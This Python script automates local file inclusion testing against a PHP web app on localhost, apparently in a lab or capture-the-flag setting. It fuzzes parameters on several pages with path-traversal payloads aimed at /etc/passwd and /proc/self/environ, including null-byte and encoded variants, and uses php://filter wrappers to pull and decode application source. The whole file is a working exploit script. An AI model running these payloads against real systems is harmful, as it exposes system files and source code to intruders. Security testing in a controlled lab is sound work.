import requests
import re
import base64
import urllib.parse
import sys

base_url = "http://127.0.0.1:33209"
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Security Research)'
})

def test_lfi_payloads(page, param):
    """Test various LFI payloads on a specific page and parameter"""
    print(f"\n{'='*60}")
    print(f"Testing LFI on {page}?{param}=")
    print(f"{'='*60}")
    
    # LFI payloads to test
    payloads = [
        # Basic file inclusions
        '../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../etc/hosts',
        '../../etc/motd',
        '../../.htaccess',
        
        # Null-byte terminated
        '../../etc/passwd%00',
        '../../../../etc/passwd%00',
        
        # URL encoded variants
        '%2e%2e%2f%2f%2e%2e%2f%2fetc%2fpasswd',
        '%2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2fetc%2fpasswd',
        
        # Double URL encoded
        '%252e%252e%252fetc%252fpasswd',
        
        # Absolute paths (may fail but useful for enumeration)
        '/etc/passwd',
        '/var/www/html/index.php',
        '/proc/self/environ',
        '/proc/version',
        '/etc/issue',
    ]
    
    findings = []
    
    print("\nTesting LFI payloads:")
    for i, payload in enumerate(payloads, 1):
        try:
            test_url = f"{base_url}{page}?{param}={urllib.parse.quote(payload, safe='')}"
            print(f"\n[{i:2d}] Testing: {payload}")
            
            response = session.get(test_url, timeout=5)
            
            # Check response for signs of successful inclusion
            response_text = response.text
            status = response.status_code
            content_length = len(response_text)
            
            print(f"     Status: {status} | Length: {content_length}B")
            
            if status == 200:
                # Look for evidence of file content in response
                indicators = [
                    'root:',  # passwd file
                    'bin:x:',  # passwd file
                    '127.0.0.1',  # hosts file
                    'www-data',  # environ
                    'Apache/2.',  # environ
                ]
                
                found_indicators = []
                for indicator in indicators:
                    if indicator.lower() in response_text.lower():
                        found_indicators.append(indicator)
                
                if found_indicators or 'root:' in response_text:
                    print(f"[!] POTENTIAL LFI SUCCESS!")
                    print(f"[!] Indicators found: {found_indicators}")
                    print(f"[!] Response excerpt:")
                    # Show first 300 characters
                    excerpt = response.text[:500]
                    print(f"  {excerpt}")
                    
                    findings.append({
                        'payload': payload,
                        'url': test_url,
                        'indicators': found_indicators,
                        'response_length': content_length,
                        'response': response_text[:500]
                    })
                elif content_length > 500:  # Large response might indicate file inclusion
                    print(f"[!] Large response ({content_length}B) - may indicate file inclusion")
                    print(f"[!] First 200 chars: {response_text[:200]}")
            
        except Exception as e:
            print(f"[-] Error testing payload '{payload}': {str(e)}")
    
    return findings

def test_all_pages_for_parameters():
    """Test all discovered PHP pages for parameter-based LFI"""
    # Pages discovered from architecture mapping
    pages_to_test = [
        '/index.php',
        '/post.php',
        '/about.php',
        '/contact.php',
        '/posts/upload-article.php'
    ]
    
    # Common parameters to test
    params_to_test = [
        'id', 'page', 'file', 'path', 'dir', 'include', 'view', 'load',
        'document', 'source', 'content', 'template', 'layout', 'fname', 'article'
    ]
    
    all_findings = {}
    
    print("\n" + "="*60)
    print("Parameter Discovery Phase")
    print("="*60)
    
    for page in pages_to_test:
        page_findings = {}
        print(f"\n[+] Testing page: {page}")
        
        # First test parameterless URL
        base_page_url = f"{base_url}{page}"
        try:
            base_response = session.get(base_page_url, timeout=5)
            base_length = len(base_response.text)
            base_content = base_response.text
            print(f"  Base length: {base_length}B")
        except Exception as e:
            print(f"  Failed to fetch base page: {e}")
            continue
        
        # Test each parameter
        for param in params_to_test:
            test_url = f"{base_url}{page}?{param}=test_lfi"
            
            try:
                response = session.get(test_url, timeout=5)
                length = len(response.text)
                status = response.status_code
                
                print(f"\n  {page}?{param}=test")
                print(f"    Status: {status} | Length: {length}B")
                
                # If response differs significantly, parameter might be processing input
                if status != 404 and abs(length - base_length) > 100:
                    print(f"    [!] Parameter '{param}' appears to be processing input (length diff: {abs(length - base_length)}B)")
                    
                    # Now test LFI payloads on this parameter
                    lfi_results = test_lfi_payloads(page, param)
                    if lfi_results:
                        page_findings[param] = lfi_results
                
                elif status == 200 and 'test_lfi' in response.text:
                    print(f"    [!] Parameter value reflected in output - potential injection point")
                    
            except Exception as e:
                print(f"    Error: {str(e)}")
        
        if page_findings:
            all_findings[page] = page_findings
    
    return all_findings

def attempt_wrapper_filters():
    """Test PHP wrapper filters for LFI"""
    print(f"\n{'='*60}")
    print(f"Testing PHP Wrappers on active parameters")
    print(f"{'='*60}")
    
    # Based on architecture mapping, focus on /index.php?page=
    page = '/index.php'
    param = 'page'
    
    wrappers = [
        'php://filter/resource=post.php',
        'php://filter/convert.base64-encode/resource=post.php',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/convert.base64-encode/resource=upload-article.php',
        'php://filter/read=string.rot13/resource=index.php',
    ]
    
    print(f"\nTesting wrappers on {page}?{param}=")
    
    for wrapper in wrappers:
        try:
            test_url = f"{base_url}{page}?{param}={urllib.parse.quote(wrapper, safe='')}"
            print(f"\n[+] Testing: {wrapper}")
            response = session.get(test_url, timeout=5)
            
            response_text = response.text
            status = response.status_code
            length = len(response_text)
            
            print(f"Status: {status} | Length: {length}B")
            
            if status == 200 and length > 0:
                if 'base64' in wrapper and length > 100:
                    print(f"[!] Base64 wrapper response detected")
                    print(f"[!] Checking for base64 patterns...")
                    # Look for base64 encoded content
                    b64_patterns = re.findall(r'([A-Za-z0-9+/]{30,}={0,2})', response_text)
                    if b64_patterns:
                        for i, pattern in enumerate(b64_patterns[:3]):
                            try:
                                decoded = base64.b64decode(pattern).decode('utf-8', errors='ignore')
                                if len(decoded) > 10:  # Meaningful content
                                    print(f"[!] Found potential base64 encoded content!")
                                    print(f"[!] Base64: {pattern[:100]}...")
                                    print(f"[!] Decoded ({len(decoded)} chars): {decoded[:300]}")
                            except:
                                pass
                
                elif 'rot13' in wrapper:
                    print(f"[!] ROT13 wrapper response:")
                    print(response_text[:300])
                
                else:
                    print(f"[!] Response:")
                    print(response_text[:300])
                    
        except Exception as e:
            print(f"[-] Error testing wrapper '{wrapper}': {str(e)}")

def check_post_php():
    """Specifically check post.php for article parameter"""
    print(f"\n{'='*60}")
    print(f"Testing /post.php for article parameter")
    print(f"{'='*60}")
    
    # Based on architecture mapping, post.php likely has article parameter
    page = '/post.php'
    param = 'article'
    
    # Test with some IDs first
    print("\n[+] Testing article parameter with numeric IDs")
    for article_id in [1, 2, 3, 4, 5]:
        test_url = f"{base_url}{page}?{param}={article_id}"
        try:
            response = session.get(test_url, timeout=5)
            print(f"\narticle={article_id}")
            print(f"Status: {response.status_code} | Length: {len(response.text)}B")
            
            if response.status_code == 200 and len(response.text) > 500:
                print(f"[!] Valid article found: {article_id}")
                print(f"First 200 chars: {response.text[:200]}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    # Now test LFI payloads
    print(f"\n[+] Testing LFI payloads on {page}?{param}=")
    lfi_results = test_lfi_payloads(page, param)
    
    return lfi_results

